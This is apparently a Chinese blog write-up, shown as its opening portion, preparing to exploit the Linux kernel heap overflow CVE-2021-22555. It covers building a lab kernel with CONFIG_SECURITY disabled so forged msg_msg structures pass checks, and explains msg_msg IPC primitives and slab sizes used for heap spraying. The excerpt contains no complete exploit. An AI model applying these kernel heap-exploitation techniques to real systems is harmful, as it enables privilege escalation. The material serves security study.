        <h1 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1>
      <p>参考文章：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>或者我写的菜鸡项目：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll.git" >KernelAll</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h2>
      <p>注意的是，在我写的项目里的CVE环境中，去掉了配置：<code>CONFIG_SECURITY=n</code>，原因是在<code>load_msg()</code>函数中申请<code>msg_msg</code>结构体时，如下所示，会调用到<code>security_msg_msg_alloc()</code>函数，给<code>msg_msg</code>结构体中的<code>security</code>指针赋值，导致下面漏洞利用时读取伪造<code>msg_msg</code>结构体由于检测<code>security</code>导致出错。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /ipc/msgutil.c</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>而去掉了配置：<code>CONFIG_SECURITY=n</code>，可以不用<code>security</code>指针，这样就不会出错了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/security.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq, struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct task_struct *target, <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					       <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct task_struct *target,</span></span></span><br><span class="line"><span class="params"><span class="function">					    <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	<span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></div></figure>

<p>但是在<code>bsauce</code>师傅提供的环境中有添加该配置，而<code>security</code>指针的值却还是为空。简单看了一下源码，如下函数链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_msg()-&gt;security_msg_msg_alloc()-&gt;lsm_msg_msg_alloc()</span><br></pre></td></tr></table></div></figure>

<p>对于<code>lsm_msg_msg_alloc()</code>函数如下定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lsm_msg_msg_alloc</span><span class="params">(struct msg_msg *mp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (blob_sizes.lbs_msg_msg == <span class="number">0</span>) &#123;</span><br><span class="line">		mp-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mp-&gt;security = kzalloc(blob_sizes.lbs_msg_msg, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (mp-&gt;security == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到这里进行相关赋值，如果满足<code>blob_sizes.lbs_msg_msg == 0</code>那么其<code>security</code>指针为空，后续检测时也依据此判断不检测。而对于这个<code>blob_sizes.lbs_msg_msg</code>不是很熟悉，可能是我的相关配置问题吧。这里为了方便，我就直接将这个配置去掉了。</p>
<p>此外经过实际测试，源码也可以看出来，其实<code>security</code>也就是一个堆地址(以0x8递增)，是不断变化的，但是如果能泄露出其中一个，那么后续检测就能都通过了。</p>

        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>完成这个漏洞的利用还是需要一些前置知识的，刚好利用这个漏洞重新完善一下相关的知识点。</p>

        <h2 id="1-msg-msg结构体—kmalloc-16至kmalloc-1024"   >
          <a href="#1-msg-msg结构体—kmalloc-16至kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-msg-msg结构体—kmalloc-16至kmalloc-1024" class="headerlink" title="1.msg_msg结构体—kmalloc-16至kmalloc-1024"></a>1.msg_msg结构体—kmalloc-16至kmalloc-1024</h2>
      <p>这个在之前也总结过，不过总结得有些错误，也不太完善，这里再好好总结一下</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linux内核中利用msg_msg结构实现任意地址读写 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linux的进程间通信 - 消息队列 · Poor Zorro’s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>《Linux系统编程手册》</p>
<p>虽然写的是最大<code>kmalloc-1024</code>，但是在堆喷时，可以连续<code>kmalloc(1024)</code>从而获得连续的堆内存分布，这样都释放掉之后再经过回收机制就可以申请到更大的<code>kmallo-xx</code>了。</p>

        <h3 id="1-使用方法"   >
          <a href="#1-使用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建"   >
          <a href="#①创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建" class="headerlink" title="①创建"></a>①创建</h4>
      <ul>
<li><p>首先创建<code>queue_id</code>管理标志，对应于内核空间的<code>msg_queue</code>管理结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//key要么使用ftok()算法生成,要么指定为IPC_PRIVATE</span></span><br><span class="line"><span class="comment">//代表着该消息队列在内核中唯一的标识符</span></span><br><span class="line"><span class="comment">//使用IPC_PRIVATE会生成全新的消息队列IPC对象</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>使用简单封装的<code>msgget</code>函数或者系统调用号<code>__NR_msgget</code>，之后保存数据的消息就会在这个<code>queue_id</code>管理标志，以及内核空间的<code>msg_queue</code>管理结构下进行创建</p>
</li>
</ul>

        <h4 id="②数据传输"   >
          <a href="#②数据传输" class="heading-link"><i class="fas fa-link"></i></a><a href="#②数据传输" class="headerlink" title="②数据传输"></a>②数据传输</h4>
      <ul>
<li><p>写入消息：</p>
<p>然后就可以依据<code>queue_id</code>写入消息了，不同于<code>pipe</code>和<code>socketpair</code>，这个需要特定的封装函数（<code>msgsnd/msgrcv</code>）或者对应的系统调用（<code>__NR_msgrcv/__NR_msgsnd</code>）来实现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_buf实际上为msgp,里面包含mtype,这个mtype在后面的堆块构造中很有用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>读取消息：</p>
<p>之后即可依据<code>queue_id</code>读取消息</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>可通过设置该值来实现不同顺序的消息读取，在之后的堆块构造中很有用</p>
<ul>
<li>在写入消息时，指定<code>mtype</code>，后续接收消息时可以依据此<code>mtype</code>来进行非顺序接收</li>
<li>在读取消息时，指定<code>msgtyp</code>，分为如下情况<ul>
<li><code>msgtyp</code>大于0：那么在<code>find_msg</code>函数中，就会将遍历寻找消息队列里的第一条等于<code>msgtyp</code>的消息，然后进行后续操作。</li>
<li><code>msgtyp</code>等于0：即类似于顺序读取，<code>find_msg</code>函数会直接获取到消息队列首个消息。</li>
<li><code>msgtyp</code>小于0：会将等待的消息当成优先队列来处理，<code>mtype</code>的值越小，其优先级越高。</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>可以关注一下<code>MSG_NOERROR</code>标志位，比如说<code>msg_flag</code>没有设置<code>MSG_NOERROR</code>的时候，那么情况如下：</p>
<p>假定获取消息时输入的长度<code>m_ts_size</code>为<code>0x200</code>，且这个长度大于通过<code>find_msg()</code>函数获取到的消息长度<code>0x200</code>，则可以顺利读取，如果该长度小于获取到的消息长度<code>0x200</code>，则会出现如下错误</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>但是如果设置了<code>MSG_NOERROR</code>，那么即使传入接收消息的长度小于获取到的消息长度，仍然可以顺利获取，但是多余的消息会被截断，相关内存还是会被释放，这个在源代码中也有所体现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcv函数中</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>此外还有更多的<code>msg_flag</code>，就不一一举例了。</p>

        <h4 id="③释放"   >
          <a href="#③释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#③释放" class="headerlink" title="③释放"></a>③释放</h4>
      <p>这个主要是用到<code>msgctl</code>封装函数或者<code>__NR_msgctl</code>系统调用，直接释放掉所有的消息结构，包括申请的<code>msg_queue</code>的结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中IPC_RMID这个cmd命令代表释放掉该消息队列的所有消息,各种内存结构体等</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id,IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>不过一般也用不到，可能某些合并obj的情况能用到?</p>
<p>此外还有更多的<code>cmd</code>命令，常用来设置内核空间的<code>msg_queue</code>结构上的相关数据，不过多介绍了。</p>

        <h4 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h4>
      <p>总结一下大致的使用方法如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-内存分配与释放"   >
          <a href="#2-内存分配与释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①创建-1"   >
          <a href="#①创建-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-1" class="headerlink" title="①创建"></a>①创建</h4>
      
        <h5 id="A-内存申请"   >
          <a href="#A-内存申请" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <ul>
<li><p>还是需要先创建<code>msg_queue</code>结构体，使用<code>msgget</code>函数，调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注最后的<code>newque()</code>函数，在该函数中使用<code>kvmalloc()</code>申请堆块，大小为0x100，属于<code>kmalloc-256</code>，(不同版本大小貌似不同)。</p>
